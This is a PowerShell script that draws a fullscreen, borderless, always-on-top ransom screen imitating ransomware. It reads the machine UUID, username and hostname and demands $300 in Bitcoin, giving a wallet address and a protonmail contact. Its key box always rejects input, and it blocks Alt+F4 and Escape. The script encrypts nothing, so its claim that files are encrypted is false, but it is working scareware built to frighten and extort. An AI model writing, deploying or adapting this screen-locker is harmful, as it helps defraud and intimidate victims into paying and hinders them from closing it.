Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.BackColor = 'Black'
$form.TopMost = $true
$form.KeyPreview = $true
$form.Text = 'Ooops, your files have been encrypted.'

# -- Header
$title = New-Object Windows.Forms.Label
$title.Text = "Ooops, your important files are encrypted."
$title.Font = New-Object Drawing.Font("Consolas", 28, 'Bold')
$title.ForeColor = 'Red'
$title.AutoSize = $false
$title.TextAlign = 'MiddleCenter'
$title.Dock = 'Top'
$title.Height = 80
$form.Controls.Add($title)

# -- Gather Device Info
$deviceID = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$username = $env:USERNAME
$hostname = $env:COMPUTERNAME

# -- Main Text
$instructions = @"

Your personal files including documents, photos, and videos have been encrypted.

Device ID: $deviceID
User: $username@$hostname

To decrypt your files, you must purchase the private key.

Instructions:
1. Send $300 worth of Bitcoin to this address:
   1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX

2. Send your Bitcoin wallet ID and the following installation key to:
   wnshth123456@protonmail.com

   Installation Key:
   zRNaqE-CDBMFC-pD5iA4-vFdSd2-14hMs5-d7UCzb-RYj3fE-ANg8rk-49XFX2-Ed2R5A

3. After payment, you will receive your decryption key.

If you already have the key, enter it below:

"@

$body = New-Object Windows.Forms.TextBox
$body.Multiline = $true
$body.ReadOnly = $true
$body.BackColor = 'Black'
$body.ForeColor = 'White'
$body.Font = New-Object Drawing.Font("Consolas", 13)
$body.Text = $instructions
$body.Dock = 'Fill'
$form.Controls.Add($body)

# -- Input Panel
$inputPanel = New-Object Windows.Forms.Panel
$inputPanel.Dock = 'Bottom'
$inputPanel.Height = 100
$inputPanel.BackColor = 'Black'

$keyLabel = New-Object Windows.Forms.Label
$keyLabel.Text = "Key:"
$keyLabel.ForeColor = 'White'
$keyLabel.Font = New-Object Drawing.Font("Consolas", 13)
$keyLabel.AutoSize = $true
$keyLabel.Location = New-Object Drawing.Point(20, 35)

$keyBox = New-Object Windows.Forms.TextBox
$keyBox.Width = 400
$keyBox.Font = New-Object Drawing.Font("Consolas", 13)
$keyBox.Location = New-Object Drawing.Point(80, 30)
$keyBox.ForeColor = 'White'
$keyBox.BackColor = 'Black'

$submit = New-Object Windows.Forms.Button
$submit.Text = "Submit"
$submit.Font = New-Object Drawing.Font("Consolas", 12, 'Bold')
$submit.Location = New-Object Drawing.Point(500, 29)
$submit.BackColor = 'DarkRed'
$submit.ForeColor = 'White'

$submit.Add_Click({
    [System.Windows.Forms.MessageBox]::Show("Invalid key. Decryption failed.","Error",0,'Error')
})

$inputPanel.Controls.Add($keyLabel)
$inputPanel.Controls.Add($keyBox)
$inputPanel.Controls.Add($submit)
$form.Controls.Add($inputPanel)

# -- Block closing
$form.Add_KeyDown({
    if ($_.Alt -and $_.KeyCode -eq "F4") { $_.Handled = $true }
    if ($_.KeyCode -eq "Escape") { $_.Handled = $true }
})

[System.Media.SystemSounds]::Exclamation.Play()
$form.ShowDialog()
